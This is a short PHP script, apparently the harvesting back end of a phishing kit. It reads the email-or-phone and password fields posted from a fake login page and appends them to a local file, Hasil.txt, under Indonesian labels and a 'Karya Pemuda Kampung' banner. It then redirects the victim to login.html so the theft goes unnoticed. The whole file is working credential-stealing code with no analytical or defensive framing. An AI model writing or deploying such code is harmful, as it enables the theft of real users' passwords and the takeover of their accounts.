<?php
header("Location: login.html");
$ADEx = "Hasil.txt";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "+++++++++./Karya Pemuda Kampung+++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "+++++++++./Karya Pemuda Kampung+++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>